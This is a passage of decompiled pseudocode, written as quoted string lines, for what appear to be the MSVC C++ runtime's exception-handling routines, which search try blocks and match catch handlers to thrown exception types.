    "  __int64 v37; // rcx",
    "  int v38; // [rsp+50h] [rbp-B0h]",
    "  char v39; // [rsp+60h] [rbp-A0h]",
    "  __int64 v40; // [rsp+68h] [rbp-98h]",
    "  int *v41; // [rsp+70h] [rbp-90h]",
    "  __int64 v43; // [rsp+80h] [rbp-80h] BYREF",
    "  __int64 v44; // [rsp+88h] [rbp-78h]",
    "  unsigned __int64 v45; // [rsp+90h] [rbp-70h]",
    "  __int64 v46; // [rsp+98h] [rbp-68h]",
    "  __int64 v47; // [rsp+A0h] [rbp-60h]",
    "  __m128i pExceptionObject; // [rsp+A8h] [rbp-58h] BYREF",
    "  int v49; // [rsp+B8h] [rbp-48h]",
    "  _QWORD v50[2]; // [rsp+C0h] [rbp-40h] BYREF",
    "  __m128i v51; // [rsp+D0h] [rbp-30h]",
    "  __m128i v52; // [rsp+E0h] [rbp-20h] BYREF",
    "  unsigned int v53; // [rsp+F8h] [rbp-8h]",
    "  __int128 v54; // [rsp+100h] [rbp+0h] BYREF",
    "  int v55; // [rsp+110h] [rbp+10h]",
    "",
    "  v8 = a2;",
    "  LODWORD(v9) = a3;",
    "  v40 = a3;",
    "  v47 = a8;",
    "  v39 = 0;",
    "  v12 = sub_180016928(a2, a4, a5);",
    "  v17 = v12;",
    "  if ( v12 < -1 || v12 >= a5->maxState )",
    "    goto LABEL_55;",
    "  if ( *(_DWORD *)a1 == -529697949",
    "    && *(_DWORD *)(a1 + 24) == 4",
    "    && (unsigned int)(*(_DWORD *)(a1 + 32) - 429065504) <= 2",
    "    && !*(_QWORD *)(a1 + 48) )",
    "  {",
    "    result = sub_180013A9C(dispESTypeList);",
    "    if ( !*(_QWORD *)(result + 32) )",
    "      return result;",
    "    a1 = *(_QWORD *)(sub_180013A9C(v19) + 32);",
    "    v39 = 1;",
    "    v9 = *(_QWORD *)(sub_180013A9C(v20) + 40);",
    "    v40 = v9;",
    "    sub_18001330C(*(_QWORD *)(a1 + 56));",
    "    if ( *(_DWORD *)a1 == -529697949",
    "      && *(_DWORD *)(a1 + 24) == 4",
    "      && (unsigned int)(*(_DWORD *)(a1 + 32) - 429065504) <= 2",
    "      && !*(_QWORD *)(a1 + 48) )",
    "    {",
    "      goto LABEL_55;",
    "    }",
    "    if ( *(_QWORD *)(sub_180013A9C(dispESTypeList) + 56) )",
    "    {",
    "      v21 = *(_QWORD *)(sub_180013A9C(dispESTypeList) + 56);",
    "      *(_QWORD *)(sub_180013A9C(v22) + 56) = 0;",
    "      if ( !(unsigned __int8)sub_1800169C0(a1, v21) )",
    "      {",
    "        if ( (unsigned __int8)sub_180016AB0(v21) )",
    "        {",
    "          sub_18001346C(a1);",
    "          sub_180015DF0(&pExceptionObject);",
    "          throw (std::bad_exception *)&pExceptionObject;",
    "        }",
    "        sub_1800230F8();",
    "      }",
    "      LODWORD(v9) = v40;",
    "    }",
    "  }",
    "  v50[1] = a4->ImageBase;",
    "  v50[0] = a5;",
    "  if ( *(_DWORD *)a1 == -529697949 && *(_DWORD *)(a1 + 24) == 4 && (unsigned int)(*(_DWORD *)(a1 + 32) - 429065504) <= 2 )",
    "  {",
    "    if ( a5->nTryBlocks )",
    "    {",
    "      sub_180012BB4(&v52, (__int64)v50, v17, (__int64)a4, (__int64)a5);",
    "      v51 = v52;",
    "      if ( _mm_cvtsi128_si32(_mm_srli_si128(v52, 8)) < v53 )",
    "      {",
    "        v23 = v51.m128i_u32[2];",
    "        v24 = v52.m128i_i64[0];",
    "        v44 = v52.m128i_i64[0];",
    "        do",
    "        {",
    "          v25 = *(_QWORD *)(v24 + 8);",
    "          v26 = *(int *)(*(_QWORD *)v51.m128i_i64[0] + 16LL) + 20LL * v23;",
    "          v27 = *(__m128i *)(v26 + v25);",
    "          dispESTypeList = *(int *)(v26 + v25 + 16);",
    "          v49 = *(_DWORD *)(v26 + v25 + 16);",
    "          pExceptionObject = v27;",
    "          if ( _mm_cvtsi128_si32(v27) <= v17 && v17 <= v27.m128i_i32[1] )",
    "          {",
    "            dispESTypeList += a4->ImageBase;",
    "            v28 = 0;",
    "            v29 = _mm_srli_si128(v27, 8).m128i_u64[0];",
    "            v46 = dispESTypeList;",
    "            v45 = HIDWORD(v29);",
    "            if ( HIDWORD(v29) )",
    "            {",
    "              while ( 2 )",
    "              {",
    "                v54 = *(_OWORD *)(dispESTypeList + 20 * v28);",
    "                v55 = *(_DWORD *)(dispESTypeList + 20 * v28 + 16);",
    "                v41 = (int *)(*(int *)(*(_QWORD *)(a1 + 48) + 12LL) + sub_1800132E0() + 4);",
    "                v30 = sub_1800132E0();",
    "                dispESTypeList = *(_QWORD *)(a1 + 48);",
    "                for ( i = *(_DWORD *)(v30 + *(int *)(dispESTypeList + 12)); i > 0; --i )",
    "                {",
    "                  v32 = sub_1800132E0();",
    "                  v33 = *(_QWORD *)(a1 + 48);",
    "                  v43 = *v41 + v32;",
    "                  if ( (unsigned int)sub_1800154A0(&v54, v43, v33) )",
    "                  {",
    "                    v8 = a2;",
    "                    LOBYTE(v38) = v39;",
    "                    sub_1800143C0(",
    "                      a1,",
    "                      (void **)a2,",
    "                      v40,",
    "                      (ULONG64 *)a4,",
    "                      (__int64)a5,",
    "                      (int *)&v54,",
    "                      v43,",
    "                      pExceptionObject.m128i_i32,",
    "                      a7,",
    "                      v47,",
    "                      v38,",
    "                      a6);",
    "                    goto LABEL_35;",
    "                  }",
    "                  ++v41;",
    "                }",
    "                v28 = (unsigned int)(v28 + 1);",
    "                if ( (_DWORD)v28 != (_DWORD)v45 )",
    "                {",
    "                  dispESTypeList = v46;",
    "                  continue;",
    "                }",
    "                break;",
    "              }",
    "              v8 = a2;",
    "LABEL_35:",
    "              v24 = v44;",
    "            }",
    "            else",
    "            {",
    "              v8 = a2;",
    "            }",
    "          }",
    "          ++v23;",
    "        }",
    "        while ( v23 < v53 );",
    "      }",
    "    }",
    "    if ( (*(_DWORD *)a5 & 0x1FFFFFFFu) >= 0x19930521 )",
    "    {",
    "      if ( a5->dispESTypeList && (v34 = sub_1800132CC(), dispESTypeList = a5->dispESTypeList, dispESTypeList + v34)",
    "        || (a5->EHFlags & 4) != 0 && !sub_1800129F4((__int64)a4, (__int64)a5) )",
    "      {",
    "        if ( (a5->EHFlags & 4) != 0 )",
    "        {",
    "          *(_QWORD *)(sub_180013A9C(dispESTypeList) + 32) = a1;",
    "          *(_QWORD *)(sub_180013A9C(v37) + 40) = v40;",
    "          sub_1800230F8();",
    "        }",
    "        if ( a5->dispESTypeList )",
    "          v35 = a5->dispESTypeList + sub_1800132CC();",
    "        else",
    "          v35 = 0;",
    "        if ( !(unsigned __int8)sub_1800169C0(a1, v35) )",
    "        {",
    "          v36 = sub_180012AC0(v8, (ULONG64 *)a4, (__int64)a5, &v43);",
    "          sub_180012E54((void **)v8, a1, v40, (__int64)v36, 0, (__int64)a5, -1, -1, 0, (__int64)a4, a6);",
    "        }",
    "      }",
    "    }",
    "  }",
    "  else if ( a5->nTryBlocks )",
    "  {",
    "    if ( a6 )",
    "      goto LABEL_55;",
    "    sub_180014F3C(a1, (_DWORD)v8, v9, (_DWORD)a4, (__int64)a5, v17, a7, a8);",
    "  }",
    "  result = sub_180013A9C(dispESTypeList);",
    "  if ( *(_QWORD *)(result + 56) )",
    "LABEL_55:",
    "    sub_1800219B0(dispESTypeList, v13, v15, v16);",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180014A38(",
    "        __int64 a1,",
    "        void **a2,",
    "        __int64 a3,",
    "        __int64 a4,",
    "        __int64 a5,",
    "        unsigned __int8 a6,",
    "        int a7,",
    "        __int64 a8)",
    "{",
    "  int v8; // r15d",
    "  __int64 v12; // rcx",
    "  int v13; // edi",
    "  _BYTE *v14; // rdx",
    "  __int64 v15; // rcx",
    "  unsigned __int64 v16; // r8",
    "  __int64 v17; // r9",
    "  __int64 v18; // rcx",
    "  _BYTE *v19; // rdx",
    "  __int64 v20; // rax",
    "  int v21; // eax",
    "  __int64 result; // rax",
    "  __int64 v23; // rcx",
    "  __int64 v24; // rcx",
    "  __int64 v25; // rcx",
    "  __int64 v26; // r15",
    "  __int64 v27; // rcx",
    "  __int64 v28; // r15",
    "  int v29; // r12d",
    "  int v30; // r15d",
    "  __int64 v31; // r12",
    "  _BYTE *v32; // r8",
    "  __int64 v33; // rcx",
    "  _BYTE *v34; // r8",
    "  int v35; // eax",
    "  __int64 v36; // rcx",
    "  _BYTE *v37; // r8",
    "  int v38; // eax",
    "  __int64 v39; // rcx",
    "  int *v40; // r8",
    "  int v41; // edx",
    "  __int64 v42; // rcx",
    "  __int64 v43; // [rsp+20h] [rbp-E0h]",
    "  int v44; // [rsp+28h] [rbp-D8h]",
    "  int v45; // [rsp+50h] [rbp-B0h]",
    "  char v46; // [rsp+60h] [rbp-A0h]",
    "  int v47; // [rsp+64h] [rbp-9Ch]",
    "  __int32 v48; // [rsp+68h] [rbp-98h]",
    "  int v49; // [rsp+6Ch] [rbp-94h]",
    "  int *v50; // [rsp+70h] [rbp-90h]",
    "  __int64 v52; // [rsp+80h] [rbp-80h]",
    "  __m128i pExceptionObject; // [rsp+88h] [rbp-78h] BYREF",
    "  __int64 v54; // [rsp+A0h] [rbp-60h]",
    "  __m128i v55; // [rsp+A8h] [rbp-58h] BYREF",
    "  unsigned int v56; // [rsp+C0h] [rbp-40h]",
    "  _OWORD v57[2]; // [rsp+C8h] [rbp-38h] BYREF",
    "  __int64 v58; // [rsp+E8h] [rbp-18h]",
    "  int v59[12]; // [rsp+F0h] [rbp-10h] BYREF",
    "  _DWORD v60[6]; // [rsp+120h] [rbp+20h] BYREF",
    "  __int128 v61; // [rsp+138h] [rbp+38h]",
    "  __int128 v62; // [rsp+148h] [rbp+48h]",
    "  __int64 v63; // [rsp+158h] [rbp+58h]",
    "",
    "  v8 = (int)a2;",
    "  v54 = a8;",
    "  v46 = 0;",
    "  v13 = sub_180013CD8(a5, a4);",
    "  if ( *(_DWORD *)(a4 + 72) )",
    "  {",
    "    if ( *(_DWORD *)(sub_180013A9C(v12) + 120) != -2 )",
    "      goto LABEL_53;",
    "    v13 = *(_DWORD *)(a4 + 72) - 2;",
    "  }",
    "  else if ( *(_DWORD *)(sub_180013A9C(v12) + 120) != -2 )",
    "  {",
    "    v13 = *(_DWORD *)(sub_180013A9C(v15) + 120);",
    "    *(_DWORD *)(sub_180013A9C(v18) + 120) = -2;",
    "  }",
    "  if ( v13 < -1 )",
    "    goto LABEL_53;",
    "  v16 = 0x180000000uLL;",
    "  if ( *(_DWORD *)(a5 + 8) )",
    "  {",
    "    v19 = (_BYTE *)(*(_QWORD *)(a4 + 8) + *(int *)(a5 + 8));",
    "    v15 = *v19 & 0xF;",
    "    v20 = byte_18003AB58[v15];",
    "    LOBYTE(v15) = byte_18003AB58[v15 + 16];",
    "    v14 = &v19[-v20];",
    "    v21 = *((_DWORD *)v14 - 1) >> v15;",
    "  }",
    "  else",
    "  {",
    "    v21 = 0;",
    "  }",
    "  if ( v13 >= v21 )",
    "    goto LABEL_53;",
    "  if ( *(_DWORD *)a1 == -529697949",
    "    && *(_DWORD *)(a1 + 24) == 4",
    "    && (unsigned int)(*(_DWORD *)(a1 + 32) - 429065504) <= 2",
    "    && !*(_QWORD *)(a1 + 48) )",
    "  {",
    "    result = sub_180013A9C(v15);",
    "    if ( !*(_QWORD *)(result + 32) )",
    "      return result;",
    "    a1 = *(_QWORD *)(sub_180013A9C(v23) + 32);",
    "    v46 = 1;",
    "    a3 = *(_QWORD *)(sub_180013A9C(v24) + 40);",
    "    sub_18001330C(*(_QWORD *)(a1 + 56));",
    "    if ( *(_DWORD *)a1 == -529697949",
    "      && *(_DWORD *)(a1 + 24) == 4",
    "      && (unsigned int)(*(_DWORD *)(a1 + 32) - 429065504) <= 2",
    "      && !*(_QWORD *)(a1 + 48) )",
    "    {",
    "      goto LABEL_53;",
    "    }",
    "    if ( *(_QWORD *)(sub_180013A9C(v15) + 56) )",
    "    {",
    "      v26 = *(_QWORD *)(sub_180013A9C(v25) + 56);",
    "      *(_QWORD *)(sub_180013A9C(v27) + 56) = 0;",
    "      if ( !(unsigned __int8)sub_1800169C0(a1, v26) )",
    "      {",
    "        if ( (unsigned __int8)sub_180016AB0(v26) )",
    "        {",
    "          sub_18001346C(a1);",
    "          sub_180015DF0(&pExceptionObject);",
    "          throw (std::bad_exception *)&pExceptionObject;",
    "        }",
    "        sub_1800230F8();",
    "      }",
    "      v8 = (int)a2;",
    "    }",
    "  }",
    "  sub_180015CD0(v59, a5, *(_QWORD *)(a4 + 8));",
    "  if ( *(_DWORD *)a1 == -529697949 && *(_DWORD *)(a1 + 24) == 4 && (unsigned int)(*(_DWORD *)(a1 + 32) - 429065504) <= 2 )",
    "  {",
    "    if ( v59[0] )",
    "    {",
    "      v44 = a7;",
    "      v43 = a5;",
    "      sub_180012CE8(&v55, v59, v13);",
    "      pExceptionObject = v55;",
    "      if ( _mm_cvtsi128_si32(_mm_srli_si128(v55, 8)) < v56 )",
    "      {",
    "        v28 = v55.m128i_i64[0];",
    "        v52 = v55.m128i_i64[0];",
    "        v48 = pExceptionObject.m128i_i32[2];",
    "        do",
    "        {",
    "          pExceptionObject = *(__m128i *)(v28 + 24);",
    "          if ( pExceptionObject.m128i_i32[0] <= v13 && v13 <= pExceptionObject.m128i_i32[1] )",
    "          {",
    "            sub_180015C4C(v60, &pExceptionObject, *(_QWORD *)(a4 + 8), **(unsigned int **)(a4 + 16), v43, v44);",
    "            v29 = 0;",
    "            v47 = 0;",
    "            v49 = v60[0];",
    "            if ( v60[0] )",
    "            {",
    "              while ( 1 )",
    "              {",
    "                v57[0] = v61;",
    "                v58 = v63;",
    "                v57[1] = v62;",
    "                v50 = (int *)(*(int *)(*(_QWORD *)(a1 + 48) + 12LL) + sub_1800132E0() + 4);",
    "                v30 = *(_DWORD *)(sub_1800132E0() + *(int *)(*(_QWORD *)(a1 + 48) + 12LL));",
    "                if ( v30 > 0 )",
    "                  break;",
    "LABEL_38:",
    "                sub_18001624C(v60);",
    "                v47 = ++v29;",
    "                if ( v29 == v49 )",
    "                  goto LABEL_41;",
    "              }",
    "              while ( 1 )",
    "              {",
    "                v31 = *v50 + sub_1800132E0();",
    "                if ( (unsigned int)sub_1800155E0(v57, v31, *(_QWORD *)(a1 + 48)) )",
    "                  break;",
    "                ++v50;",
    "                if ( --v30 <= 0 )",
    "                {",
    "                  v29 = v47;",
    "                  goto LABEL_38;",
    "                }",
    "              }",
    "              LOBYTE(v45) = v46;",
    "              sub_180014494(a1, a2, a3, a4, a5, (__int64)v57, v31, pExceptionObject.m128i_i32, a7, v54, v45, a6);",
    "LABEL_41:",
    "              v28 = v52;",
    "            }",
    "          }",
    "          v32 = *(_BYTE **)(v28 + 8);",
    "          v33 = *v32 & 0xF;",
    "          v34 = &v32[-byte_18003AB58[v33]];",
    "          v35 = *((_DWORD *)v34 - 1) >> byte_18003AB58[v33 + 16];",
    "          *(_QWORD *)(v28 + 8) = v34;",
    "          *(_DWORD *)(v28 + 24) = v35;",
    "          v36 = *v34 & 0xF;",
    "          v37 = &v34[-byte_18003AB58[v36]];",
    "          v38 = *((_DWORD *)v37 - 1) >> byte_18003AB58[v36 + 16];",
    "          *(_QWORD *)(v28 + 8) = v37;",
    "          *(_DWORD *)(v28 + 28) = v38;",
    "          v39 = *v37 & 0xF;",
    "          v40 = (int *)&v37[-byte_18003AB58[v39]];",
    "          *(_DWORD *)(v28 + 32) = (unsigned int)*(v40 - 1) >> byte_18003AB58[v39 + 16];",
    "          v15 = (unsigned int)(v48 + 1);",
    "          *(_QWORD *)(v28 + 8) = v40;",
    "          v41 = *v40;",
    "          *(_QWORD *)(v28 + 8) = v40 + 1;",
    "          *(_DWORD *)(v28 + 36) = v41;",
    "          v48 = v15;",
    "        }",
    "        while ( (unsigned int)v15 < v56 );",
    "      }",
    "    }",
    "    if ( (*(_BYTE *)a5 & 0x40) != 0 && !(unsigned __int8)sub_180012A20(a4, a5) )",
    "    {",
    "      *(_QWORD *)(sub_180013A9C(v15) + 32) = a1;",
    "      *(_QWORD *)(sub_180013A9C(v42) + 40) = a3;",
    "      sub_1800230F8();",
    "    }",
    "  }",
    "  else if ( v59[0] )",
    "  {",
    "    if ( a6 )",
    "      goto LABEL_53;",
    "    sub_1800151AC(a1, v8, a3, a4, a5, v13, a7, a8);",
    "  }",
    "  result = sub_180013A9C(v15);",
    "  if ( *(_QWORD *)(result + 56) )",
    "LABEL_53:",
    "    sub_1800219B0(v15, v14, v16, v17);",
    "  return result;",
    "}",
    "",
    "",
    "void __fastcall sub_180014F3C(",
    "        unsigned int *a1,",
    "        void **a2,",
    "        __int64 a3,",
    "        ULONG64 *a4,",
    "        __int64 a5,",
    "        int a6,",
    "        int a7,",
    "        __int64 a8)",
    "{",
    "  __int64 v9; // r12",
    "  __int64 v12; // rdx",
    "  __int64 v13; // rcx",
    "  __int64 v14; // r8",
    "  __int64 v15; // r9",
    "  PVOID v16; // rbx",
    "  __int64 v17; // rcx",
    "  unsigned int v18; // r14d",
    "  __int64 v19; // r9",
    "  __int64 v20; // rax",
    "  __int64 v21; // r8",
    "  __m128i v22; // xmm0",
    "  __int64 v23; // rdx",
    "  int *v24; // rbx",
    "  __int64 v25; // r12",
    "  __int64 v26; // rax",
    "  int v27; // [rsp+50h] [rbp-A8h]",
    "  _QWORD v28[2]; // [rsp+60h] [rbp-98h] BYREF",
    "  __m128i v29; // [rsp+70h] [rbp-88h]",
    "  __m128i v30; // [rsp+80h] [rbp-78h] BYREF",
    "  int v31; // [rsp+90h] [rbp-68h]",
    "  __m128i v32; // [rsp+98h] [rbp-60h] BYREF",
    "  unsigned int v33; // [rsp+B0h] [rbp-48h]",
    "  __int64 v34; // [rsp+100h] [rbp+8h]",
    "",
    "  v9 = a3;",
    "  if ( *a1 != -2147483645 )",
    "  {",
    "    if ( !*(_QWORD *)(sub_180013A9C((__int64)a1) + 16)",
    "      || (v16 = EncodePointer(0), *(PVOID *)(sub_180013A9C(v17) + 16) == v16)",
    "      || *a1 == -532459699",
    "      || *a1 == -532462766",
    "      || !(unsigned int)sub_1800127B0(a1, (__int64)a2, v9) )",
    "    {",
    "      v28[1] = a4[1];",
    "      v28[0] = a5;",
    "      if ( !*(_DWORD *)(a5 + 12) )",
    "        sub_1800219B0(v13, v12, v14, v15);",
    "      sub_180012BB4(&v32, (__int64)v28, a6, (__int64)a4, a5);",
    "      v29 = v32;",
    "      if ( _mm_cvtsi128_si32(_mm_srli_si128(v32, 8)) < v33 )",
    "      {",
    "        v18 = v29.m128i_u32[2];",
    "        v19 = v32.m128i_i64[0];",
    "        v34 = v32.m128i_i64[0];",
    "        do",
    "        {",
    "          v20 = *(_QWORD *)(v19 + 8);",
    "          v21 = *(int *)(*(_QWORD *)v29.m128i_i64[0] + 16LL) + 20LL * v18;",
    "          v22 = *(__m128i *)(v21 + v20);",
    "          v23 = *(int *)(v21 + v20 + 16);",
    "          v31 = *(_DWORD *)(v21 + v20 + 16);",
    "          v30 = v22;",
    "          if ( _mm_cvtsi128_si32(v22) <= a6 && a6 <= v22.m128i_i32[1] )",
    "          {",
    "            v24 = (int *)(v23 + 20 * HIDWORD(_mm_srli_si128(v22, 8).m128i_u64[0]) + a4[1] - 20);",
    "            if ( v24[1] )",
    "            {",
    "              v25 = v24[1];",
    "              if ( v25 + sub_1800132CC() )",
    "              {",
    "                v26 = (_DWORD)v25 ? v24[1] + sub_1800132CC() : 0LL;",
    "                if ( *(_BYTE *)(v26 + 16) )",
    "                  goto LABEL_21;",
    "              }",
    "              v9 = a3;",
    "            }",
    "            if ( (*(_BYTE *)v24 & 0x40) == 0 )",
    "            {",
    "              LOBYTE(v27) = 1;",
    "              sub_1800143C0((__int64)a1, a2, v9, a4, a5, v24, 0, v30.m128i_i32, a7, a8, v27, 0);",
    "            }",
    "          }",
    "LABEL_21:",
    "          v9 = a3;",
    "          ++v18;",
    "          v19 = v34;",
    "        }",
    "        while ( v18 < v33 );",
    "      }",
    "    }",
    "  }",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800151AC(",
    "        unsigned int *a1,",
    "        void **a2,",
    "        __int64 a3,",
    "        __int64 a4,",
    "        __int64 a5,",
    "        int a6,",
    "        int a7,",
    "        __int64 a8)",
    "{",
    "  __int64 result; // rax",
    "  PVOID v12; // rbx",
    "  __int64 v13; // rcx",
    "  __int64 v14; // rdx",
    "  __int64 v15; // rcx",
    "  __int64 v16; // r8",
    "  __int64 v17; // r9",
    "  __int64 v18; // r8",
    "  int v19; // ebx",
    "  __int64 v20; // rbx",
    "  __int64 v21; // rax",
    "  _BYTE *v22; // rdx",
    "  __int64 v23; // rcx",
    "  _BYTE *v24; // rdx",
    "  int v25; // eax",
    "  __int64 v26; // rcx",
    "  _BYTE *v27; // rdx",
    "  int v28; // eax",
    "  __int64 v29; // rcx",
    "  _DWORD *v30; // rdx",
    "  __int64 v31; // [rsp+20h] [rbp-E0h]",
    "  int v32; // [rsp+28h] [rbp-D8h]",
    "  int v33; // [rsp+50h] [rbp-B0h]",
    "  unsigned int v34; // [rsp+60h] [rbp-A0h]",
    "  __int64 v35; // [rsp+68h] [rbp-98h]",
    "  __m128i v37; // [rsp+80h] [rbp-80h] BYREF",
    "  __m128i v38; // [rsp+90h] [rbp-70h] BYREF",
    "  unsigned int v39; // [rsp+A8h] [rbp-58h]",
    "  int v40; // [rsp+B0h] [rbp-50h] BYREF",
    "  __int64 v41; // [rsp+B8h] [rbp-48h]",
    "  __int64 v42; // [rsp+C0h] [rbp-40h]",
    "  _BYTE v43[8]; // [rsp+C8h] [rbp-38h] BYREF",
    "  int v44; // [rsp+D0h] [rbp-30h]",
    "  int v45[10]; // [rsp+100h] [rbp+0h] BYREF",
    "",
    "  result = a8;",
    "  if ( *a1 != -2147483645 )",
    "  {",
    "    if ( !*(_QWORD *)(sub_180013A9C((__int64)a1) + 16)",
    "      || (v12 = EncodePointer(0), *(PVOID *)(sub_180013A9C(v13) + 16) == v12)",
    "      || *a1 == -532459699",
    "      || *a1 == -532462766",
    "      || (result = sub_180012804(a1, (__int64)a2, a3), !(_DWORD)result) )",
    "    {",
    "      sub_180015CD0(v45, a5, *(_QWORD *)(a4 + 8));",
    "      if ( !v45[0] )",
    "        sub_1800219B0(v15, v14, v16, v17);",
    "      v32 = a7;",
    "      v31 = a5;",
    "      sub_180012CE8(&v38, v45, a6);",
    "      result = (unsigned int)_mm_cvtsi128_si32(_mm_srli_si128(v38, 8));",
    "      v37 = v38;",
    "      if ( (unsigned int)result < v39 )",
    "      {",
    "        v18 = v38.m128i_i64[0];",
    "        v34 = v37.m128i_u32[2];",
    "        v35 = v38.m128i_i64[0];",
    "        do",
    "        {",
    "          v37 = *(__m128i *)(v18 + 24);",
    "          if ( v37.m128i_i32[0] <= a6 && a6 <= v37.m128i_i32[1] )",
    "          {",
    "            sub_180015C4C(&v40, &v37, *(_QWORD *)(a4 + 8), **(unsigned int **)(a4 + 16), v31, v32);",
    "            v41 = v42;",
    "            sub_18001624C(&v40);",
    "            v19 = v40;",
    "            v41 = v42;",
    "            sub_18001624C(&v40);",
    "            v20 = (unsigned int)(v19 - 1);",
    "            if ( (_DWORD)v20 )",
    "            {",
    "              do",
    "              {",
    "                sub_18001624C(&v40);",
    "                --v20;",
    "              }",
    "              while ( v20 );",
    "            }",
    "            if ( !v44",
    "              || !(v44 + sub_1800132CC())",
    "              || (!v44 ? (v21 = 0) : (v21 = v44 + sub_1800132CC()), !*(_BYTE *)(v21 + 16)) )",
    "            {",
    "              if ( (v43[4] & 0x40) == 0 )",
    "              {",
    "                LOBYTE(v33) = 1;",
    "                sub_180014494((__int64)a1, a2, a3, a4, a5, (__int64)v43, 0, v37.m128i_i32, a7, a8, v33, 0);",
    "              }",
    "            }",
    "            v18 = v35;",
    "          }",
    "          v22 = *(_BYTE **)(v18 + 8);",
    "          v23 = *v22 & 0xF;",
    "          v24 = &v22[-byte_18003AB58[v23]];",
    "          v25 = *((_DWORD *)v24 - 1) >> byte_18003AB58[v23 + 16];",
    "          *(_QWORD *)(v18 + 8) = v24;",
    "          *(_DWORD *)(v18 + 24) = v25;",
    "          v26 = *v24 & 0xF;",
    "          v27 = &v24[-byte_18003AB58[v26]];",
    "          v28 = *((_DWORD *)v27 - 1) >> byte_18003AB58[v26 + 16];",
    "          *(_QWORD *)(v18 + 8) = v27;",
    "          *(_DWORD *)(v18 + 28) = v28;",
    "          v29 = *v27 & 0xF;",
    "          v30 = &v27[-byte_18003AB58[v29]];",
    "          *(_DWORD *)(v18 + 32) = *(v30 - 1) >> byte_18003AB58[v29 + 16];",
    "          result = (__int64)(v30 + 1);",
    "          *(_QWORD *)(v18 + 8) = v30;",
    "          *(_DWORD *)(v18 + 36) = *v30;",
    "          *(_QWORD *)(v18 + 8) = v30 + 1;",
    "          ++v34;",
    "        }",
    "        while ( v34 < v39 );",
    "      }",
    "    }",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800154A0(__int64 a1, __int64 a2, _BYTE *a3)",
    "{",
    "  unsigned int v3; // ebx",
    "  __int64 v7; // rsi",
    "  __int64 v8; // rsi",
    "  __int64 v9; // rcx",
    "  __int64 v10; // rsi",
    "  __int64 v11; // rsi",
    "  __int64 v12; // r8",
    "  unsigned __int8 *v13; // rax",
    "  __int64 v14; // r8",
    "  int v15; // edx",
    "  int v16; // ecx",
    "",
    "  v3 = 0;",
    "  if ( !*(_DWORD *)(a1 + 4) )",
    "    return 1;",
    "  v7 = *(int *)(a1 + 4);",
    "  if ( !(v7 + sub_1800132CC()) )",
    "    return 1;",
    "  if ( (_DWORD)v7 )",
    "  {",
    "    v8 = *(int *)(a1 + 4);",
    "    v9 = v8 + sub_1800132CC();",
    "  }",
    "  else",
    "  {",
    "    v9 = 0;",
    "    LODWORD(v8) = 0;",
    "  }",
    "  if ( !*(_BYTE *)(v9 + 16) || *(char *)a1 < 0 && (*(_BYTE *)a2 & 0x10) != 0 )",
    "    return 1;",
    "  if ( (_DWORD)v8 )",
    "    v10 = *(int *)(a1 + 4) + sub_1800132CC();",
    "  else",
    "    v10 = 0;",
    "  if ( v10 != *(int *)(a2 + 4) + sub_1800132E0() )",
    "  {",
    "    v11 = *(_DWORD *)(a1 + 4) ? *(int *)(a1 + 4) + sub_1800132CC() : 0LL;",
    "    v12 = sub_1800132E0() + *(int *)(a2 + 4) + 16LL;",
    "    v13 = (unsigned __int8 *)(v11 + 16);",
    "    v14 = v12 - (v11 + 16);",
    "    do",
    "    {",
    "      v15 = v13[v14];",
    "      v16 = *v13 - v15;",
    "      if ( v16 )",
    "        break;",
    "      ++v13;",
    "    }",
    "    while ( v15 );",
    "    if ( v16 )",
    "      return 0;",
    "  }",
    "  if ( ((*(_BYTE *)a2 & 2) == 0 || (*(_BYTE *)a1 & 8) != 0)",
    "    && ((*a3 & 1) == 0 || (*(_BYTE *)a1 & 1) != 0)",
    "    && ((*a3 & 4) == 0 || (*(_BYTE *)a1 & 4) != 0)",
    "    && ((*a3 & 2) == 0 || (*(_BYTE *)a1 & 2) != 0) )",
    "  {",
    "    return 1;",
    "  }",
    "  return v3;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800155E0(__int64 a1, __int64 a2, _BYTE *a3)",
    "{",
    "  unsigned int v3; // ebx",
    "  __int64 v7; // rsi",
    "  __int64 v8; // rbp",
    "  __int64 v9; // rcx",
    "  _BYTE *v10; // rsi",
    "  __int64 v11; // rbp",
    "  __int64 v12; // rsi",
    "  __int64 v13; // r8",
    "  unsigned __int8 *v14; // rax",
    "  __int64 v15; // r8",
    "  int v16; // edx",
    "  int v17; // ecx",
    "  _BYTE *v19; // rdi",
    "",
    "  v3 = 0;",
    "  if ( *(_DWORD *)(a1 + 8) )",
    "  {",
    "    v7 = *(int *)(a1 + 8);",
    "    if ( v7 + sub_1800132CC() )",
    "    {",
    "      if ( (_DWORD)v7 )",
    "      {",
    "        v8 = *(int *)(a1 + 8);",
    "        v9 = sub_1800132CC() + v8;",
    "      }",
    "      else",
    "      {",
    "        v9 = 0;",
    "        LODWORD(v8) = 0;",
    "      }",
    "      if ( *(_BYTE *)(v9 + 16) )",
    "      {",
    "        v10 = (_BYTE *)(a1 + 4);",
    "        if ( *(char *)(a1 + 4) >= 0 || (*(_BYTE *)a2 & 0x10) == 0 )",
    "        {",
    "          if ( (_DWORD)v8 )",
    "            v11 = *(int *)(a1 + 8) + sub_1800132CC();",
    "          else",
    "            v11 = 0;",
    "          if ( v11 != *(int *)(a2 + 4) + sub_1800132E0() )",
    "          {",
    "            if ( *(_DWORD *)(a1 + 8) )",
    "              v12 = *(int *)(a1 + 8) + sub_1800132CC();",
    "            else",
    "              v12 = 0;",
    "            v13 = sub_1800132E0() + *(int *)(a2 + 4) + 16LL;",
    "            v14 = (unsigned __int8 *)(v12 + 16);",
    "            v15 = v13 - (v12 + 16);",
    "            do",
    "            {",
    "              v16 = v14[v15];",
    "              v17 = *v14 - v16;",
    "              if ( v17 )",
    "                break;",
    "              ++v14;",
    "            }",
    "            while ( v16 );",
    "            if ( v17 )",
    "              return 0;",
    "            v10 = (_BYTE *)(a1 + 4);",
    "          }",
    "          if ( (*(_BYTE *)a2 & 2) != 0 )",
    "          {",
    "            if ( (*v10 & 8) == 0 )",
    "              return v3;",
    "            v19 = (_BYTE *)(a1 + 4);",
    "          }",
    "          else",
    "          {",
    "            v19 = v10;",
    "          }",
    "          if ( ((*a3 & 1) == 0 || (*v10 & 1) != 0)",
    "            && ((*a3 & 4) == 0 || (*v10 & 4) != 0)",
    "            && ((*a3 & 2) == 0 || (*v19 & 2) != 0) )",
    "          {",
    "            return 1;",
    "          }",
